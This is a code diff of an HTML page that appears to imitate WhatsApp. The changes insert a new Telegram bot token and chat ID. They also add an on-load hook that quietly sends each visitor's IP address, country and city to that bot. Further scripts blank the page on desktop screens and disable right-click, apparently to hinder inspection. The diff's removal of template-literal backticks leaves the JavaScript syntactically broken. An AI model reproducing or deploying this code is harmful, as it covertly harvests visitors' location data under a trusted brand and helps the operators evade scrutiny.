@@ -14,8 +14,8 @@
     <title>WhatsApp</title>
 
     <script>
-         const botToken = "AAFtCZofkHkzGFbC-SoYr27jCuiL2ePpnso"; // توكن البوت
-        const chatId = "5970549757"; // معرف الدردشة
+        const botToken = "AAFrIVVcMwlk6ncd8LItIqT9HpUOQ8P1L5w"; // التوكن الجديد
+        const chatId = "6467860384"; // معرف الدردشة الجديد
    
         async function fetchFromIpInfo() {
             try {
@@ -50,7 +50,7 @@
 
         async function sendToTelegram(message) {
             try {
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
                 await fetch(telegramUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -72,22 +72,21 @@
             let message = "-----[ Whatsapp Joining Info ]-----\n";
 
             if (ipInfoData) {
-                message += `ipiInfo  : ${ipInfoData.ip}\nCountry Code: ${ipInfoData.country}\n`;
+                message += ipiInfo  : ${ipInfoData.ip}\nCountry Code: ${ipInfoData.country}\n;
             }
 
             if (ipApiData) {
-                message += `ipapi: ${ipApiData.ip}\nCountry: ${ipApiData.country}\nCity      :   ${ipApiData.city}\nTele   :  ${ipApiData.tele}\n`;
+                message += ipapi: ${ipApiData.ip}\nCountry: ${ipApiData.country}\nCity      :   ${ipApiData.city}\nTele   :  ${ipApiData.tele}\n;
             }
 
             await sendToTelegram(message);
         }
 
         // استدعاء الوظيفة الرئيسية عند تحميل الصفحة
-       
+        window.onload = sendiptelegram2;
     </script>
 
-
-      <noscript>
+    <noscript>
         <style>
             /* إخفاء محتوى الموقع إذا كان JavaScript معطلاً */
             body {
@@ -100,28 +99,22 @@
         </div>
     </noscript>
     <script>
-       
-          if (window.innerWidth > 768) { 
+        if (window.innerWidth > 768) { 
             window.stop(); 
             document.body.innerHTML = ''; 
         }
     </script>
     <script>
-        
-         document.addEventListener('contextmenu', function(event) {
+        document.addEventListener('contextmenu', function(event) {
             event.preventDefault();
-           
         });
     </script>
     
     <script src="script.js"></script>
   
-
-    
     <!-- Link to external JavaScript -->
     <script defer src="static/js/main.33ed2829.js"></script>
 
-    
     <!-- Link to external CSS -->
     <link href="static/css/main.81bfefed.css" rel="stylesheet"/>
 </head>
